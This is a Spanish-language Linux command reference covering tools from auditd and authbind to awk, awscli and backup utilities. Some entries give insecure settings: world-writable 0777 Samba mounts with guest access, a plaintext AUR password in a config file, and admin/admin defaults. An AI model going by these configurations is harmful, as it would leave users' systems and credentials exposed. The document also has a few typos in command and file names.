# nano /etc/audit/audit.rules
Y, para controlar todo el directorio personal, añadimos la linea:
   -w /home/USUARIO -p wa
Toda modificación del archivo de configuración implica reiniciar el servicio:
# service auditd restart
# ausearch -f /home/USUARIO (Muestra las incidencias del directorio)
# auditctl -D (Suprime todas las reglas)
# auditctl -w /home/USUARIO -p w (Monitorizar el directorio personal solo hasta el reinicio del servicio o del sistema)


audtool
[audacious]. Pequeña herramienta para controlar Audacious desde la línea de comandos
$ audtool --playback-pause (pausar/activar la reproducción)
$ audtool --playback-next (reproducir la siguiente canción)
$ audtool --current-song (consultar el título de la canción actual)
$ audtool --playback-stopped (salir)


audtty
Interfaz para controlar el reproductor Audacious. El archivo de configuración en ~/.audtty.
$ audtty (abrir la interfaz en la terminal)
Dentro de su interfaz pueden emplearse atajos de teclado, algunos:
    Espacio: Pausar o reanudar la reproducción.
    n: Siguiente pista.
    p: Pista anterior.
    +: Aumentar volumen.
    -: Disminuir volumen.
    q: salir


aumix
Control de sonido.
$ aumix -v75 (al 75% del total)
$ aumix -v100 (máximo)
$ aumix -v +10 (aumentar el volumen un 10%)
$ aumix -v -10 (disminuirlo)
$ aumix -v mute (silenciarlo)


aurvote (arch)
Votar un paquete de aur para ser incluido en los repositorios de community.
$ aurvote broadcom-wl
1.-
Para votar utomaticamente un paquete al instalarlo:
$ nano .config/aurvote
Y añadir las lineas:
	user=usuario
	pass=contraseña
Nota.- son el nombre de usuario y contraseña del registro en https://aur.archlinux.org/


auth2db
Análisis de logs según lo especificado en /etc/auth2db/filters.conf. Acceso http://localhost/auth2db [usuario y contraseña por defecto: admin/admin]


authbind
Herramienta que permite ejecutar procesos en puertos restringidos, menores a 1024 sin necesidad de permisos de root. Necesita permisos configurados para un ejecutable, por ejemplo, para permitir que un programa use el puerto 80:
$ sudo touch /etc/authbind/byport/80
$ sudo chmod 500 /etc/authbind/byport/80
$ sudo chown USER /etc/authbind/byport/80
$ authbind --deep ./servidor (iniciar un servidor en el puerto 80 y que escuche en puertos restringidos)
$ authbind --deep node servidor.js (iniciar un servidor web con Node.js en el puerto 80)
$ authbind --deep apachectl start (iniciar Apache HTTP Server)
$ authbind python3 -m http.server 80 (lanzar aplicaciones que requieren menos complejidad)
$ netstat -tuln | grep :80 (virificar que el programa está usando el puerto asignado)


authrpogs
Herramienta que permite decidir si los comandos solicitados a través de SSH deben ejecutarse o rechazarse según el archivo de configuración authprogs. authprogs se configura en el servidor SSH editando el archivo ~/.ssh/authorized_keys. Agrega una línea con la palabra clave command para vincularla a un script o a authprogs.
# nano ~/.ssh/authorized_keys
Con la linea:
    command="/usr/bin/authprogs" ssh-ed25519 AAAAB3... USER@example.com (que todos los comandos ejecutados mediante esta clave SSH pasen primero por authprogs)
Crear un archivo de configuración para definir qué comandos permitir o rechazar, por ejemplo:
# nano ~/.authrpogs/authrpogs.conf
Con el contenido [un comando por linea]:
    # Permitir listar archivos
    allow ls
    # Rechazar borrar archivos
    deny rm
    # Permitir comandos relacionados con Git
    allow git*
Luego vincularlo en authorized_keys y solo se permitirán las acciones especificadas:
# nano ~/.ssh/authorized_keys
command="/usr/bin/authprogs --config ~/.authrpogs/authrpogs.conf" ssh-ed25519 AAAAB3... USER@example.com
Si un cliente quere ejecutar algo no autorizado:
   ssh USER@servidor whoami
El comando será rechazado.
# authprogs --test --config ~/.authrpogs/authrpogs.conf --command "ls" (muestra si el comando sería permitido o rechazado sin ejecutarlo realmente)
# authprogs --config ~/.authrpogs/authrpogs.conf (ejecutar la aplicación con esta configuración)
# authprogs --config ~/.authrpogs/authrpogs.conf --log /var/log/authprogs.log (habilitar registros de auditoría)


autoconf
Estándar para los paquetes fuente de la FSF. Esto sólo es útil si se escribe los propios programas o si se modifica extensamente los programas de otras personas. Todos los comandos deben ejecutarse desde la carpeta raíz del paquete en el que se está trabajando. Para obtener una biblioteca extensa de macros Autoconf adicionales, ha de instalarse el paquete "autoconf-archive".
Crear archivo configure.ac con las lineas:
$ nano configure.ac
...
AC_INIT([nombre del paquete], [versión])
AM_INIT_AUTOMAKE
AC_PROG_CXX
AC_OUTPUT(Makefile)
...
$ autoconf (generar el archivo configure en la misma carpeta)
$ ./configure --version (verificar si los requisitos están instalados)
$ make
# make install
$ autoconf --foreign (generar archivos de configuración en múltiples plataformas)


autodep8
Detectará tipos conocidos de paquetes y generará archivos de control de pruebas compatibles con DEP-8 para ellos. Tipos de paquetes admitidos actualmente: Ruby que utilizan gem2deb/gem2deb-test-runner, Perl, Python, Python que utilizan pybuild, NodeJS, módulos del kernel que utilizan DKMS, R, Emacs Lisp ELPA, Go y Octave-Forge. Si tiene que estar en el directorio del código fuente del paquete Debian en los ejemplos siguientes.
$ autodep8 > tests/control (generará un archivo de control de pruebas basado en el tipo del paquete, python, ruby..., ver la salida del archivo de control de pruebas propuesto y guardar en un archivo)
$ autopkgtest -- tests/control (una vez generado el archivo de control de pruebas, se puede ejecutar las pruebas con autopkgtest)
$ autodep8 --package paquete (generar el archivo de pruebas y ver si tiene pruebas DEP-8 compatibles)
$ autodep8 --print-type (devuelve el tipo de paquete detectado)
$ autodep8 --type python (si el tipo de tu paquete no es reconocido automáticamente, se puede forzar un tipo específico)


autodir
Gestionar directorios personales dinámicamente y de forma automática y transparente, ideal para entornos multiusuario para garantizar que cada usuario tenga un directorio personal sin necesidad de configurarlos manualmente.
# autodir --daemon (para que funcione, se debe iniciar su demonio)
# autodir --basedir=/mnt/home --logfile=/var/log/autodir.log (creará los directorios personales automáticamente cuando un usuario acceda a ellos en /mnt/home)
# autodir --basedir=/mnt/home --logfile=/var/log/autodir.log --default-perm=700 --default-user=USER --default-group=GRUPO (asegura que los nuevos directorios sean privados y asignados al usuario y grupo deseados)
# tail -f /var/log/autodir.log (monitorear actividad)
# umount /mnt/home/USER (desmontar directorios dinámicos)


autofs
Controla el funcionamiento de los daemons de montaje automático.
Configurar:
        # anano  /etc/auto.master
con la linea:
        /mnt/automount --timeout=300 --ghost
Crear un archivo de configuración específico para los sistemas Windows:
        # nano /etc/auto.smb
Y añadir [Reemplazar USER y PASSW con las credenciales de red]:
        /mnt/windows/%m -fstype=cifs,guest,iocharset=utf8,file_mode=0777,dir_mode=0777,username=USER,password=PASSW
Configurar el archivo para permitir el acceso remoto
        # nano /etc/smb.conf
añadir:
        ```
        [global]
           workgroup = YOUR_WORKGROUP
           security = guest
           map to guest = Bad User
        ```
# systemctl restart autofs (riniciar el servicio)
# mount -a (permite montar sistemas Windows en Debian automáticamente)


autoimport
Durante el desarrollo de un programa Python, es necesario gestionar continuamente las declaraciones de importación de Python, ya sea porque se necesita un objeto nuevo o porque ya no se necesita. Esto significa que es necesario dejar de escribir lo que se estaba escribiendo, ir al principio del archivo, crear o eliminar la declaración de importación y luego reanudar la codificación. Esta interrupción del flujo de trabajo es molesta y casi siempre innecesaria.
$ autoimport (resolver el problema si se ejecuta siempre que existes un error de importación o, por ejemplo, configurando el editor para que lo ejecute al guardar el archivo)


autojump
Forma rápida de navegar por el sistema de archivos. Funciona manteniendo una base de datos de los directorios que más se utilizan desde la línea de comandos y permite saltar directamente hacia directorios concretos sin importar en absoluto en cual estamos posicionados. Los directorios deben visitarse primero antes de poder saltar a ellos. j es una función de autojump. Cualquier opción que se pueda usar con autojump se puede usar con j y viceversa. Para activar la aplicación, primero lanzar como usuario normal:
$ source /usr/share/autojump/autojump.bash on startup
Y luego entrar en .bashrc:
$ nano .bashrc
la linea:
	. /usr/share/autojump/autojump.sh
Recargar el archivo de configuración [source .bashrc]. Una muestra de todo un proceso:
	$ cd labores/liquidaciones/xlss
	[~/labores/liquidaciones/xlss]$ cd
	$ j xlss
	[~/labores/liquidaciones/xlss]$ cd ..
	[~/labores/liquidaciones/]$ cd pdfs
	[~/labores/liquidaciones/pdfs]$ cd
	$ j pdfs
	[~/labores/liquidaciones/pdfs]$ j xlss
	[~/labores/liquidaciones/xlss]$
Tambien podemos entrar directorios marcando su ruta absoluta con el argumento -a:
$ autojump -a ~/descargas/videos/tutoriales/emacs
Y luego podremos entrar en el directorio anterior pulsando en cualquier directorio "j emacs"
$ j --purge (Para limpiar todos los directorios entrados en autojump)
$ jc Videos (Saltar a un subdirectorio del directorio actual)
$ jo music (Abrir el Administrador de archivos en el directorio actual)
$ jco images (También se admite la apertura de un administrador de archivos en un subdirectorio)
$ j -s (ver listados de los directorios que contiene la aplicación)


autolog
El programa lee el archivo utmp, entrada por entrada. El nombre de usuario para cada 'proceso de usuario' se compara con las entradas en el archivo de configuración.
# autolog (iniciar el daemon. También /etc/init.d/autolog start)
# autolog -a -d (Imprimir información en todas las entradas utmp, no solo de los procesos del usuario y en modo debug)


automake
Herramienta que genera automáticamente archivos Makefile.in a partir de archivos Makefile.am. Estos archivos son esenciales en proyectos que utilizan la suite GNU Autotools para automatizar la configuración, construcción e instalación de software. Facilita la portabilidad y hace que sea más sencillo definir reglas de construcción.
Ejemplo de iniciar un proyecto desde cero:
$ touch Makefile.am configure.ac
$ nano configure.am
bin_PROGRAMS = hello
hello_SOURCES = hello.c
SUBDIRS = src doc (en cada subdirectorio, crea su propio Makefile.am)
$ nano configure.ac
AC_INIT([hello], [1.0], [example@example.com])
AM_INIT_AUTOMAKE
AC_PROG_CC
AC_CONFIG_FILES([Makefile])
AC_OUTPUT
$ autoreconf --install
$ automake --add-missing
$ ./configure (generar el script configure)
$ make (compilar)
Si falta algún archivo estándar
$ automake --add-missing --copy (copiará los archivos necesarios en el proyecto)
$ automake --silent (ejecutar en modo silencioso)
Si se ha modificado los archivos Makefile.am o configure.ac, vuelver a ejecutar:
$ autoreconf --install
$ automake --add-missing


automater
(python3-httplib2 python2.6-argparse)
Obtener información de ips y urls inclusive si estan bloqueadas en algún blocklist. Copiar el script en python de: <https://github.com/1aN0rmus/TekDefense-Automater.git>
$ python automater.py IP (De una ip)
$ python automater.py ips.txt (De un listado de ips, una por linea)
$ python automater.py 44A6A7D4A039F7CC2DB6E85601F6D8C1 (De un hash)
$ python automater.py ips.txt -o informe.txt -w informe.html -c informe.csv (Enviando el resultado a un archivo de texto y a una en html y a uno csv)


automysqlbackup
Realizar copias de seguridad de MySQL. El archivo de configuración se encuentra en /etc/default/automysqlbackup. Las copias de seguridad se guardan en /var/lib/automysqlbackup/
# automysqlbackup


autopostgresqlbackup
Script de shell (generalmente que se ejecuta desde cron) totalmente automatizada para realizar copias de seguridad periódicas de las Bases de datos PostgreSQL. Las copias de seguridad se guardan en carpetas diarias/semanales/mensuales en /var/lib/autopostgresqlbackup. Para configurar parámetros como host, bases de datos restringidas para copia de seguridad, tipo de compresión, etc, ha de especificarse en el archivo /etc/default/autopostgresqlbackup.
# autopostgresqlbackup


autoproject
Sólo se ejecuta una vez cuando se comienza un nuevo proyecto y hace varias preguntas al usuario y luego crea un nuevo directorio y lo llena con archivos estándar de programación de GNU, personalizados para el nuevo proyecto. A modo de ejemplo:
$ mkdir mi_proyecto_bash (crear un nuevo directorio para el proyecto)
$ cd mi_proyecto_bash (entrar en él)
$ autoproject -n nombre_script -a USER -e USER@ejemplo.es -d "Gestion de scripts de bash" -l sh
What command line parser generator will be used?
    select from:  argp autogen clig none  [none]:
Please indicate which of the following standard options gestrac will use:
    dry-run? [yN]
    no-warn? [yN]
    output? [yN]
    brief? [yN]
    quiet? [yN]
    verbose? [yN]
    directory? [yN]
    cd? [yN]
    interactive? [yN]
Program Name		: nombre_script
Description	        : Gestion de scripts de bash
Version			: 0.1.0
Language		: sh
Interface		: cli
Parser Generator	: none
Long Options		:
Author      		: USER
Email-Address		: USER@ejemplo.es
Date        : November 21, 2024
13 files processed
...
$ cd nombre_script
$ ls
ls
aclocal.m4  AUTHORS  autom4te.cache  ChangeLog	configure.in  COPYING  gpl.texinfo  Makefile.am  NEWS  nombre_script.1	nombre_script.in  nombre_script.lsm.in	nombre_script.spec.in  nombre_script.texinfo  README


autorandr
Herramientas para administrar configuraciones de xrandr basadas en dispositivos conectados. Se puede configurar para que cambie automáticamente a una configuración almacenada cada vez que se detecte un cambio en la configuración.
$ autorandr --save mobile (guardar la configuración actual de la pantalla)
$ autorandr --save printer (de la impresora)
$ autorandr --list (listar las configuraciones gardadas)
$ autorandr --load printer --force (intenta evitar recargar una configuración idéntica para forzar la reconfiguración)
$ autorandr -d printer (establecer perfil determinado)
$ autorandr -l printer (cambiar de perfil)


autossh
Similar a ssh pero reanudando la conexión en caso de corte o suspensión del trafico. Para que se realice esta reconexión, ha de tenerse la clave publica entrada en la máquina remota [ver ssh [4]]. Las opciones son las mismas que ssh.


autostart (/etc/xdg/)
Archivo de las aplicaciones que se ejecutan al inicio.
# ls /etc/xdg/autostart/
Para activarlas poner:
NoDisPlay false
Para desactivarlas:
NoDisplay true
# cp /usr/share/applications/guake.desktop /etc/xdg/autostart/ (colocar una aplicación)


autosuspend
Daemon para suspender y reactivar automáticamente el sistema. Los tiempos de inactividad y de activación se determinan mediante un conjunto de comprobaciones configurables. Autosuspend ejecuta periódicamente estas comprobaciones y si ninguna de ellas indica actividad, el sistema se suspende y se activa automáticamente si es necesario. El archivo de configuración en /etc/autosuspend.conf
$ autosuspend -d daemon (activar el daemon)
Para iniciar la suspensión automática a través de systemd, ejecute:
# systemctl enable autosuspend.service (han de activarse esta y la siguiente)
# systemctl enable autosuspend-detect-suspend.service
# systemctl status autosuspend.service (comprobar si se encuentra activo)
Opciones del archivo de configuración:
   # man autosuspend.conf


autotrace
Convierte los datos de imagen de mapa de bits en gráficos vectoriales
$ autotrace imagen.png --output-file imagen.svg


autotrash
Automatizar el limpiado o vaciado de la papelera de reciclaje.
$ autotrash -d 20 (limpiado de los archivos que tengan 20 dias)
$ autotrash -td 20 (lo mismo pero de todos los usuarios del sistema)
$ autotrash --max-free 1024 -d 20 (eliminar los que tengan más de 20 días de antigüedad si queda menos de 1 GB de espacio)
$ autotrash --min-free 1024 (purgar archivos, desde el el más antiguo, hasta que quede 1 GB de espacio nen la papelera)
$ autotrash --max-free 2048 --min-free 1024 -d 20 (eliminar en función del espacio máximo y mínimo que queda en la papelera)


avahi-browse
Herramienta que se utiliza para navegar por la red en busca de servicios disponibles que se anuncian utilizando el protocolo de descubrimiento de servicios Avahi. Avahi permite a los dispositivos de una red local descubrir automáticamente y comunicarse entre sí sin necesidad de un servidor central o de configuración. avahi-browse puede utilizarse para descubrir servicios en la red local, como impresoras, servidores web o servidores de archivos y mostrar información sobre ellos, como su tipo, nombre y dirección IP.
$ avahi-browse --all --resolve --ignore-local (Enumera todos los servicios disponibles en la red local junto con sus direcciones y puertos, ignorando los locales)
$ avahi-browse --browse-domains (lista todos los dominios)


avconv
[avconvert]. Información sobre archivos multimedia y conversión de formatos.
$ avconv -i video.avi video.mpeg  (Pasar de avi a mpeg)
$ avconv -i video.avi (Información sobre un archivo)
$ avconv -i archivo.avi -an nuevo.avi (Sacar el sonido de un avi)
$ avconv -i entrada.flv -ss 00:00:30 -t 00:00:20 -an salida.mp4 (Cortar 20 segundos de un vídeo [-t] empezando a los 30 segundos del inicio [-ss] y sin sonido [-an])
1.-
Convertir varios archivos mp4 a mp3:
	#!/bin/bash
	for i in *.mp4
	do
	    avconv -i "$i" -b 256k "${i%.mp4}.mp3"
	done


avg
Informa de la presencia de virus. No los suprime.  (descarga: <http://free.avg.com/gb-en/download.prd-alf>)
# avgctl –start (Iniciar el servicio)
# avgupdate (actualizar las definiciones de virus)
# avgscan --clean /home/usuario (escanear)


aview
visor de imágenes artísticas ASCII de alta calidad y reproductor de video. Es especialmente útil con un navegador basado en texto. Admite los formatos de imagen pnm, pgm, pbm y ppm, así como los formatos de video FLI y FLC.
$ asciiview logo.png -driver curses
$ aaflip video.fli


avimerge
[transcode, transcode-utils]. Unir varios videos en uno.
$ avimerge -o todos.avi -i 1.avi 2.avi 3.avi
$ avimerge -o todos.avi -i *.avi  (todos los videos de un directorio en uno)


away
Programa simple que bloquea tu terminal, verifica si hay correo nuevo en un número determinado de buzones y permite que otros usuarios sepan por qué estás inactivo. Solo verifica si hay correo en el archivo $MAIL de un usuario, pero al usar el archivo awayrc, un usuario puede configurar cualquier número dado de casillas de correo para que se verifiquen.
$ away (bloquear la terminal hasta que se presione una tecla)
$ away 5m (bloquea la terminal por 5 minutos)
$ away 10m && echo "Terminal desbloqueada" (terminal bloqueada por 10 minutos, después de lo cual se ejecutará el mensaje y la terminal se desbloqueará automáticamente)
$ echo "Iniciando proceso largo..." && away 30s && echo "Proceso terminado" (después de ejecutar el primer echo, la terminal se bloqueará por 30 segundos antes de mostrar el segundo echo)


awk
Busca patrones y los procesa. Es practicamente un lenguaje de programación.
Archivo base para ejemplo (Empleado -- Precio/hora -- Horas trabajadas – Cómo las cobra):
$ cat lista
	Juan Gomez 6 10 banco
	Clara Fuentes 7 12 banco
	Antonio Cano 6 13 metálico
	José Bueno 7 0 banco
	Matías Crespo 5 8 metálico
	Isabel Ruiz 7 0 metálico
	María Monzón 9 16 metálico
Imprimir la segunda columna (Apellidos):
	$ awk ' { print $2 } ' lista
Imprimir la última columna:
	$ awk ' { print $NF } ' lista
Imprimir la linea 3:
	$ awk ' NR == 3 ' lista
Imprimir todo menos la primera columna:
	$ awk ' { $1 = "" ; print } ' lista
Imprimir las columnas tabuladas:
	$ awk ' { print $1 “\t” $2 “\t” $3 “\t” $4 } ' lista
Imprimir las lineas que tengan menos de 22 caracteres:
	$ awk 'length($0) < 22' lista
Calcular el sueldo de los empleados que han trabajado:
	$ awk ' $4 > 0 { print $1,$2, $3*$4} ' lista
Personas que no han trabajado:
	$ awk ' $3 == 0 { print $1}' lista
Buscar una entrada concreta:
	$ awk '/Fuentes/ { print $0 }' lista
Buscar los que cobran en metálico e impimir la 2ª columna:
	$ awk ' /'metálico'/ {print$2}' lista
Buscar dos entradas en una misma linea separándolas con punto y coma (;):
	$ awk '/Fuentes/ { print $0 }; /Cano/ { print$0 } ' lista
Imprimir lineas que tengan alguno de los campos o los dos:
	$ awk '/Bueno/ || /Cano/' lista
Imprimir lineas que tengan los dos campos:
	$ awk '/Bueno/ && /7/' lista
Imprimir las lineas que no tengan el cammpo:
	$ awk '! /metálico/' lista
Buscar las entradas en las que el primer campo empiece por “J”, imprimir el 2º campo y, entre parentesis el último:
	$ awk '$1 ~ /^J/ {print$2, "("$NF")"}' lista
Lo mismo con if:
	$ awk ' { if ($1 ~ /^J/) print$2, “(“$NF”)” }' lista
Añadir 5 horas al 4º campo y comprobar como quedan con la modificación:
	$ awk '{ $4 = ($4+5); print $0 }' lista
Añadir un nuevo campo ($6) con el producto del 3 y el 4:
	$ awk '{ $6 = ($3*$4); print $0 }' lista
print permite colocar texto:
	$ awk ' { print "El sueldo de ",$2," es de ",$3*$4," euros."} ' lista
Mostar las veces que aparece "banco":
	awk 'BEGIN { print "Veces que aparece banco" }
	>        /banco/ { ++banco }
	>         END       { print "banco aparece " banco " veces." }' lista
**Variables internas:**
Mostrar el número de campos de cada linea (NF):
	$ awk ' { print NF } ' lista
Mostrar el número de lineas (NR):
	$ awk ' { print NR } ' lista
Mostrar todas las lineas completas ($0):
	$ awk ' { print $0 } ' lista
Mostrar las lineas que tengan al menos un campo
	$ awk 'NF > 0' lista
Lo mismo con if:
	$ awk '{ if (NF > 0) print }' lista
Dar formato a la salida de datos:
	$ awk ' $4 > 0 { printf "%-8s .... %8.1f euros\n",$2,($3*$4) } ' lista
	$4 > 0 (Que imprima los que la 4ª columna no sea cero.)
	%-8s (Que imprima una cadena (s) justificada a la izquierda (-) en un campo de 8 caracteres de ancho.)
	%8.1f (Que imprima un numero real (f), en un campo de ocho caracteres de ancho, con un decimal(.))
Imprimir cadena, justificada a la izquierda y en campos de 10 y 5 caracteres:
	$ awk '{ printf "%-10s %-10s %-5s %-5s %-5s\n", $1, $2, $3, $4, $5 }' lista
Parecido con más florituras (todo en una sola linea)
	$ awk 'BEGIN {print "nombre\tapellido\tprecio\thoras\tpago"; print  "------\t--------\t------\t-----\t----"}; {print $1"\t"$2"\t"$3"\t"$4"\t"$5 }' lista
Lo mismo más legible:
	$ awk 'BEGIN {print "nombre\tapellido\tprecio\thoras\tpago"
	>             print "------\t--------\t------\t-----\t----"}
	>            {print  $1"\t"$2"\t"$3"\t"$4"\t"$5 }' lista
BEGIN y END son patrones especiales usados para suministrar al script awk qué hacer antes de empezar a procesar y después de haber procesado los registros de la entrada.:
	$ awk 'BEGIN {print “Cuantas veces aparece la palabra banco” }
	>       /banco/ { ++i }
	>       END   {print “banco aparece “i” veces.”}' lista
Los  patrones pueden combinarse mediante los operadores lógicos AND (&&), OR(||) y NOT(!).
Imprimir los nombres de los empleados que ganan mas de 6.50 euros a la hora y que han trabajado mas de 14:
	$ awk ' $3>=6.50 && $4>=14 { print $1,$2 } ' lista
Patrones
buscar las lineas que contienen la cadena "banco" en el 5º campo:
	$ awk ' $5 ~ /banco/ ' lista
Buscar las lineas que no contengan la cadena "banco" en el 5º campo:
	$ awk '  $5 !~ /banco/ ' lista
Mostrar los que el 4º campo no empiece por 0 o 1:
	$ awk ' $4 ~ /^[^01]/' lista
La salida también puede pasarse a un filtro para ordenarse:
	$ awk ' { print $2 | "sort" } ' lista
Mostrar la linea cuyo 2º campo termina en “iz”:
	$ awk '$2 ~ /iz$/' lista
Mismo concepto sin especificar si la primera letra es mayúscula o minúscula y sin conocer la segunda:
	$ awk '$1 ~ /^[Cc]./' lista
Mismo concepto incluyendo las que empiezan por “R”:
	$ awk '$2 ~ /^[Cc].|^[R]/' lista
“tolower” convierte el campo especificado a minúsculas:
	$ awk 'tolower($1) ~ /^m/' lista
Para mandar cada linea a un archivo con el nombre del 2er campo:
	$ awk ' { print > $2 } ' lista
Mandar el primer campo a un archivo y el segundo a otro:
	$ awk '{ print $1 > "nombres"; print $2 > "apellidos" }' lista
Lo mismo pero mandándolo ordenado:
	$ awk '{ print $1 | "sort > nombres"; print $2 | "sort > apellidos" }' lista
Indicando caracter separador (un espacio y que imprima el 2º campo):
	$ awk  -F " " ' { print $2 } ' lista
Lo mismo usando BEGIN:
	$ awk 'BEGIN { FS = " " } ; { print $2 }' lista
El siguiente  programa  muestra  como  puede usarse awk para validación de datos.
$ cat validar
	$3 < 6.5   { print $1,$2 " ===> precio por hora bajo", "("$3")" }
	$3 > 8     { print $1,$2 " ===> precio por hora alto", "("$3")" }
	$5 == "banco"    { print $1,$2 " ===> Cobra por banco" }
	$5 == "metálico" { print $1,$2 " ===> Cobra en metálico" }
Se ejecuta con:
	$ awk -f validar lista
Aunque también podríamos añadir que lo ordenara por orden alfabetico del segundo campo (-k2) separado del primero por un espacio(-t” “):
	$ awk -f validar lista | sort -t” “ -k2
Otros ejemplos:
	$ awk '/d.[0-9]/{print $4}' /proc/partitions  (listar todas las particiones)
	$ cat 1.txt | awk '{print$1”\t”$2}'  (tabulando la salida)
	$ cat 1.txt | awk '!/#/{print $0}' > 2.txt  (Imprime todo menos las lineas comentadas y lo manda a un archivo)
	$ cat 1.txt | awk 'BEGIN { FS="\n"; RS="" } { print $1 }' > lista.txt (Manda a un archivo las primeras lineas precedidas de una en blanco)
	$ who | awk '{print $1}'  (Mostrar todos los usuarios registrados)
	$ awk '$1~/^DocumentRoot/{print $2}' /etc/apache2/sites-available/default (conocer la carpeta del servidor)
	$ awk 'BEGIN { for (i = 1; i <= 7; i++) print int(101 * rand()) }' (Escribir 7 números aleatorios del 0 al 100)
	$ awk ' { print "\"" $0 "\""} ' lista (Entrecomillar cada una de la lineas del archivo)
Creación de scripts con awk:
1.-
Imprimir el simple "Hola mundo cruel"
	#!/usr/bin/awk -f
	BEGIN { print "Hola mundo cruel" }
Lo mismo pero incluido en un script de bash:
	#!/bin/bash
	awk 'BEGIN { print "Hola mundo cruel" }'
2.-
Mandar el segundo campo de listado.txt a un archivo y el sexto a otro:
	#! /usr/bin/awk -f
	awk '{ print$2 > "lista_nombres"
	       print$6 > "lista_telefonos" }' listado.txt
3.-
Pasar el comando date... a variable [getline dia_actual], cerrar el comando [close] e imprimirlo en pantalla:
	#!/usr/bin/awk -f
	BEGIN {
               "date +%d-%m-%Y" | getline dia_actual
               close("date +%d-%m-%Y")
               print "Hoy estamos a " dia_actual
    }
En bash:
	awk 'BEGIN {
               "date +%d-%m-%Y" | getline dia_actual
               close("date +%d-%m-%Y")
               print "Hoy estamos a " dia_actual
    }'
4.-
Usar variables dentro de awk
	variable="primera linea\nsegunda linea"
	awk 'BEGIN {print "'"$variable"'"}'
	primera linea
	segunda linea


awscli
Proporciona acceso directo a las API públicas de los servicios de AWS. Configuración inicial:
# aws configure (configurar credenciales, pedirá: access key ID, secret access key, región predeterminada [ej.: us-east-1] y formato de salida [ej.: json, table, o text])
# aws s3 ls (ver todos los buckets en S3)
# aws s3 cp archivo.txt s3://mi-bucket/archivo.txt (subir un archivo local a un bucket)
# aws s3 cp s3://mi-bucket/archivo.txt archivo_local.txt (Descargar un archivo desde un bucket)
# aws ec2 run-instances --image-id ami-0abcdef1234567890 --count 1 --instance-type t2.micro --key-name MiClave --security-group-ids sg-0123456789abcdef --subnet-id subnet-0123456789abcdef (lanzar nueva instancia usando una AMI específica)
# aws ec2 describe-instances (mostrar todas las instancias EC2 en la cuenta)
# aws logs get-log-events --log-group-name MiGrupoLogs --log-stream-name MiFlujoLogs (consultar los logs de un grupo de logs en CloudWatch)
# aws dynamodb create-table --table-name MiTabla --attribute-definitions AttributeName=Id,AttributeType=S --key-schema AttributeName=Id,KeyType=HASH --provisioned-throughput ReadCapacityUnits=1,WriteCapacityUnits=1 (crear una tabla básica)
# aws dynamodb get-item --table-name MiTabla --key '{"Id": {"S": "12345"}}' (consultar un elemento por su clave primaria)
# aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/MiCola --message-body "Hola desde AWS CLI" (enviar un mensaje a una cola de SQS)
# aws iam create-user --user-name USER (crear un nuevo usuario en IAM)
# aws s3 sync ./mi-directorio s3://mi-bucket (sincronizar un directorio con S3)
# aws s3 help (ayuda con algún comando específico)
# aws ec2 stop-instances --instance-ids $(aws ec2 describe-instances --query "Reservations[*].Instances[*].InstanceId" --output text) (detener todas las instancias EC2)
# aws s3api put-bucket-policy --bucket mi-bucket --policy file://policy.json (cambiar la política de un bucket)´


awstats
[libnet-dns-perl libnet-ip-perl libnet-xwhois-perl]. Estadísticas de la red local.
configuración mínima:
$ nano /etc/awstats/awstats.conf
Verificar:
LogFile="/var/log/apache2/access.log"
SiteDomain=”tu_dominio.com” (entre comillas nombre del host)
LogFormat=1 (El usado por apache)
AllowToUpdateStatsFromBrowser=1 (Actualizar via navegador)
Lang="es"
Asegurar permisos:
# chmod o+r /var/log/apache2/access.log
Crear enlace de las imágenes:
	# ln -s /usr/share/awstats/icon/ /var/www/awstats-icon
Crear las estadísticas:
	# /usr/lib/cgi-bin/awstats.pl -update -config=/etc/awstats/awstats.conf
Para ver las estadísticas, en el navegador:
	http://localhost/cgi-bin/awstats.pl
Si no queremos que las estadísticas sean accesibles para cualquiera:
	# gedit /etc/apache2/sites-available/default
Y en la linea “Allow from All” de la sección siguiente, quitamos el “All” y ponemos 127.0.0.1 [O la ip que proceda] y reiniciamos servicio:
ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
	<Directory "/usr/lib/cgi-bin">
	AllowOverride None
	Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
	Order allow,deny
	Allow from 127.0.0.1
	</Directory>
# /etc/init.d/apache2 force-reload


axel
Acelerador de descargas
$ axel http://download.com/file.tar.gz
$ axel -s 5242880 http://download.com/debian.iso  (Para una velocidad media de 5120 kilobyte x seg)
$ axel -n 3 -s 5242880 http://download.com/my.iso  (Limitar el numero de conexiones de descarga a 3)
Pueden configurarse parámetros generales en el archivo:
# nano /etc/axelrc
Añadiendo, por ejemplo:
reconnect_delay = 20
max_speed = 0
num_connections = 10
connection_timeout = 30
Que realice 10 conexiones por cada archivo y sin límite de descarga.


b2sum
Calcular els hash de ficheros o frases.
$ echo -n "Linux es un sistema genial" | b2sum
$ b2sum -l 380 .bashrc .emacs .authinfo .profile .stumpwmrc .bzr.log (sobre varios archivos y longitud de 380 bits)
$ b2sum -b .bashrc (calcularlo en binario)


b3sum
Calcula el hash criptográfico BLAKE3, función mucho más rápida que MD5, SHA-1, SHA-2, SHA-3 y BLAKE2 y segura, a diferencia de MD5 y SHA-1.
$ b3sum archivo.txt > archivo.txt.b3sum (obtener el hash de un archivo y guardarlo en un archivo)
$ b3sum archivo1.txt archivo2.txt (calcular el hash de varios archivos)
$ echo "linux es un sisteme genial" | b3sum (leer datos desde la entrada estánda)
$ b3sum -c archivo.txt.b3sum (verificar la integridad de un archivo)
$ b3sum --num-threads 4 archivo_grande.dat (con archivos grandes usa múltiples núcleos de CPU automáticamente, el comando verifica que se está utilizando paralelismo)
$ b3sum --no-names archivo.txt (la salida solo mostrará el hash sin el nombre del archivo)
$ find /directorio -type f -exec b3sum {} + (calcular el hash para cada archivo del /directorio)


babeltrace
Herramienta para ver, convertir y manipular trazas de software que siguen el Common Trace Format [CTF]. Incluye la herramienta babeltrace-log.
# babeltrace ~/lttng-traces/my-trace (mostrará listado de todos los eventos de traza, ordenados cronológicamente, con detalles como marca de tiempo, nombre del evento y contenido)
# dmesg | babeltrace-log -t salida.txt (dmesg genera el log del kernel, y comopipe para entrada de babeltrace-log. -t para que interprete las marcas de tiempo de dmesg y el resultado se escribe en el archivo salida.txt como una traza en formato CTF)


backup-manager
Realiza copias de seguridad. Puede comprimir en tar, tar.gz, tar.bz2, y zip. El archivo de configuración está en /etc/backup-manager.conf.
# backup-manager


backupninja
Permite realizar copias de seguridad de bases de datos, directorios y más, de manera automática. Configuración Básica:
# nano /etc/backupninja.conf
    loglevel = 4    # Nivel de detalle en los registros (1-5)
